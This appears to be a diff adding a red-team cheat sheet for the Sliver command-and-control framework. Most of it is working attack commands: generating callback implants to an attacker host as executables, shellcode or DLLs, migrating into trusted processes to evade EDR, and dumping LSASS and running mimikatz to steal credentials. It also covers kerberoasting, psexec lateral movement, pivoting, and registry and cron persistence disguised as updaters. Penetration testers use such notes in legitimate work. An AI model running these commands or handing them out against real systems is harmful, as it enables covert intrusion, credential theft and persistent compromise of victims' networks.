@@ -1,0 +1,226 @@
+# Sliver
+
+Sliver is an open-source C2 framework from BishopFox. It supports multiple transport protocols, in-memory execution via BOFs and .NET assemblies, and built-in pivoting, making it a full replacement for commercial C2 frameworks in most engagement scenarios.
+
+## Core Concepts
+
+**C2 server vs implant:** The Sliver server runs on your attacker machine and exposes listener ports. The implant runs on the target and calls back to those listeners. You interact with implants through the Sliver console.
+
+**Beacon vs Session:** A beacon checks in at a configurable interval (e.g. every 60 seconds), receives queued tasks, executes them, then goes back to sleep. A session holds a persistent interactive connection that responds immediately. Beacons are far stealthier and are preferred for real engagements. Sessions are useful for quick interactive work but generate continuous traffic.
+
+**Implant naming:** Sliver auto-assigns a random two-word name to each implant (e.g. `WARM_LUMBERMAN`, `SILENT_MOTH`). This name is how you reference the implant across `use`, `sessions`, and `beacons` commands. You can rename with `rename`.
+
+**Task-based execution:** In beacon mode, commands you issue are queued on the server. They are not executed until the beacon checks in. Use `tasks` to see pending and completed tasks, and `tasks fetch <id>` to retrieve the output of a specific task.
+
+## Listeners
+
+Listeners run on the C2 server and wait for implant callbacks. Choose the transport based on what egress is available on the target network and your OPSEC requirements.
+
+```bash
+mtls                                       # mutual TLS on port 8888; fully authenticated and encrypted
+https                                      # HTTPS on port 443; most firewall-friendly, preferred for engagements
+https --lhost 0.0.0.0 --lport 443         # explicitly bind HTTPS to all interfaces on 443
+http --lhost 0.0.0.0 --lport 80           # plain HTTP; never use on a real engagement
+dns --domains c2.yourdomain.com            # DNS-based C2; works through strict egress filtering but slowest
+
+jobs                                       # list all active listeners (jobs)
+jobs --kill <job-id>                       # stop a specific listener
+```
+
+## Generating Implants
+
+Beacons are the default choice. Session implants are available when you need immediate interactivity. Output format determines whether you get an EXE, DLL, raw shellcode, or service binary.
+
+```bash
+# Beacon implants (preferred for real engagements)
+generate beacon --https $LHOST:443 --save .      # HTTPS beacon, output to current directory
+generate beacon --http $LHOST:80 --save .        # HTTP beacon
+generate beacon --mtls $LHOST:8888 --save .      # mTLS beacon
+
+# Beacon with OPSEC timing (randomised check-in reduces traffic pattern detection)
+generate beacon --https $LHOST:443 \
+  --seconds 60 \                               # base check-in interval in seconds
+  --jitter 30 \                                # adds up to 30s random delay (actual range: 60-90s)
+  --save .
+
+# Session implants (persistent interactive connection, noisier)
+generate --https $LHOST:443 --save .
+generate --mtls $LHOST:8888 --save .
+
+# Platform targeting
+generate beacon --https $LHOST:443 --os windows --arch amd64 --save .   # Windows x64
+generate beacon --https $LHOST:443 --os linux --arch amd64 --save .     # Linux x64
+generate beacon --https $LHOST:443 --os darwin --arch arm64 --save .    # macOS Apple Silicon
+
+# Output formats
+generate beacon --https $LHOST:443 --format exe --save .                # default Windows executable
+generate beacon --https $LHOST:443 --format shellcode --save .          # raw shellcode for injection
+generate beacon --https $LHOST:443 --format shared --save .             # DLL (for side-loading or injection)
+generate beacon --https $LHOST:443 --format service --save .            # Windows service binary
+
+implants                                       # list all previously generated implants
+```
+
+## Session Management
+
+These commands manage active beacons and sessions from the main Sliver console. Once you `use` an implant, subsequent commands run in its context.
+
+```bash
+beacons                          # list all beacons waiting to check in
+sessions                         # list all active interactive sessions
+use <id>                         # interact with a beacon or session by ID (tab-complete works)
+background                       # return to the Sliver main console from an implant context
+interactive                      # open a temporary interactive session from within a beacon context
+sessions --kill <id>             # kill a specific session
+rename --name NEW_NAME           # rename the current implant to something memorable
+tasks                            # list all queued and completed tasks for the current beacon
+tasks fetch <task-id>            # pull the output of a specific completed task
+```
+
+## Recon
+
+Basic situational awareness commands to run immediately after getting a callback. Understand the user, host, network position, and what security tooling is present before doing anything else.
+
+```bash
+whoami                  # current username and domain
+getuid                  # numeric user ID (Linux) or SID (Windows)
+hostname                # machine hostname
+ifconfig                # all network interfaces and IP addresses
+netstat                 # active network connections (useful for spotting other C2 or monitoring)
+ps                      # full process list with PID, name, owner, and architecture
+getprivs                # list current privileges and enabled tokens (Windows)
+getsystem               # attempt automatic privilege escalation to SYSTEM (Windows)
+screenshot              # capture a screenshot of the target desktop
+```
+
+## File Operations
+
+Standard file management from within a session or beacon context. Downloads and uploads work on both Windows and Linux targets.
+
+```bash
+upload /local/path/file.exe /remote/C:/Temp/file.exe     # push a file to the target
+download /remote/C:/Windows/Temp/loot.txt /local/loot/   # pull a file back to attacker
+ls /path/to/dir                                          # list directory contents
+cat /path/to/file                                        # read a file and print to console
+mkdir /path/to/newdir                                    # create a directory
+rm /path/to/file                                         # delete a file
+```
+
+## Shell Access
+
+Use `execute` for single commands instead of opening a full interactive shell. A full shell is noisier, harder to log, and draws more EDR attention.
+
+```bash
+execute -o whoami                        # run a single command and capture output
+execute -o "net user /domain"            # run with arguments; quote the full command string
+execute -o "ipconfig /all"
+shell                                    # open a full interactive shell (bash or PowerShell); noisy, avoid if possible
+```
+
+## Process Operations
+
+Process listing helps you identify AV and EDR processes and find good migration targets. Migrating into a legitimate, long-running process makes the implant harder to detect and more survivable.
+
+```bash
+ps                                       # list all running processes with PID, name, owner, and architecture
+migrate <pid>                            # migrate implant into the target process
+                                         # good targets: explorer.exe, svchost.exe, RuntimeBroker.exe
+                                         # avoid: cmd.exe, powershell.exe (both are heavily monitored)
+procdump <pid>                           # dump memory of a process to disk on the target
+                                         # use on the LSASS PID for credential extraction offline
+```
+
+## Pivoting
+
+Sliver has built-in SOCKS5 and port forwarding to route traffic through an implant into unreachable network segments.
+
+```bash
+# SOCKS5 proxy: route tool traffic through the implant
+socks5 start --host 127.0.0.1 --port 1080   # bind a SOCKS5 proxy locally on the C2 server
+# add to /etc/proxychains.conf: socks5 127.0.0.1 1080
+# then route any tool through it:
+# proxychains nxc smb 192.168.1.0/24 -u user -p pass
+
+socks5                                       # list active SOCKS5 proxies
+socks5 stop --id <id>                        # stop a proxy
+
+# Local port forward: expose an internal service on your local machine
+portfwd add --remote 192.168.1.5:445 --local 127.0.0.1:8445   # access internal SMB via local 8445
+
+# Reverse port forward: expose your attacker service to the internal network
+rportfwd add --remote 8080 --local 192.168.1.10:80             # target network can reach your port 8080
+
+portfwd                                      # list active port forwards
+rportfwd                                     # list active reverse port forwards
+```
+
+## Lateral Movement
+
+Sliver provides a built-in PsExec-style lateral movement command. For shellcode-based movement, generate a shellcode implant and inject it via a BOF or in-memory loader.
+
+```bash
+# Built-in PsExec-style lateral movement
+psexec --hostname $TARGET.$DOMAIN --username Administrator --password $PASSWORD
+
+# Generate shellcode beacon for manual injection into a remote process
+generate beacon --mtls $LHOST:8888 --format shellcode --save /tmp/beacon.bin
+# then load beacon.bin via execute-bof, a custom loader, or a third-party injector
+```
+
+## Armory
+
+Armory is Sliver's extension manager. It installs community tools (Rubeus, SharpHound, Seatbelt, Mimikatz, and others) as aliases that run in-memory via BOFs or .NET assemblies. Nothing touches disk.
+
+```bash
+armory install all                       # install all available packages
+armory install rubeus                    # install a single tool by name
+armory list                              # list available packages and their descriptions
+
+# After installation, run tools directly from any beacon or session context
+rubeus kerberoast                                          # Kerberoast all SPNs from memory
+rubeus asktgt /user:svc_account /password:Password123!    # request a TGT
+seatbelt -group=all                                        # comprehensive host enumeration
+mimikatz "sekurlsa::logonpasswords" "exit"                 # dump credentials from LSASS
+sharpup audit                                             # check for common privesc paths
+```
+
+## BOFs
+
+BOF (Beacon Object File) is a compiled C object that runs inside the beacon process. No binary is dropped to disk, the footprint is minimal, and execution is fast. Sliver is compatible with Cobalt Strike BOFs.
+
+```bash
+execute-bof /path/to/file.o                              # load and execute a BOF locally
+
+# TrustedSec's CS-Situational-Awareness-BOF pack works directly in Sliver
+# Install via armory or load .o files manually with execute-bof
+```
+
+## Persistence
+
+Persistence mechanisms keep the implant running across reboots. Run these carefully and clean up after the engagement.
+
+```bash
+# Windows: write to the HKCU Run registry key (runs at user logon, no admin needed)
+registry write \
+  --hive HKCU \
+  --path "Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
+  --key "Updater" \
+  --value "C:\\Users\\user\\AppData\\Local\\updater.exe" \
+  --type string
+
+# Linux: add a cron job for persistence
+cron add --name persist --cmd "/tmp/.update" --schedule "*/5 * * * *"   # runs every 5 minutes
+```
+
+## OPSEC Tips
+
+Operational security considerations for using Sliver on real engagements:
+
+- Prefer beacons over sessions in every engagement; persistent connections are trivial to flag in network monitoring
+- Set sleep and jitter to at least 60 seconds base with 30 seconds jitter; flat check-in intervals are easy to detect
+- Use mTLS or HTTPS transports; plain HTTP is never acceptable on a real engagement
+- Migrate out of your initial shell process immediately after getting a beacon (cmd.exe and powershell.exe are heavily monitored by EDR)
+- Good migration targets: `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe`, `OneDrive.exe`
+- Run post-ex tools via armory in-memory rather than uploading and executing binaries from disk
+- For HTTPS listeners, configure a custom C2 profile that mimics real browser traffic (realistic User-Agent, Host header, URI paths)
+- Kill all listeners and sessions at the end of an engagement; do not leave C2 infrastructure running
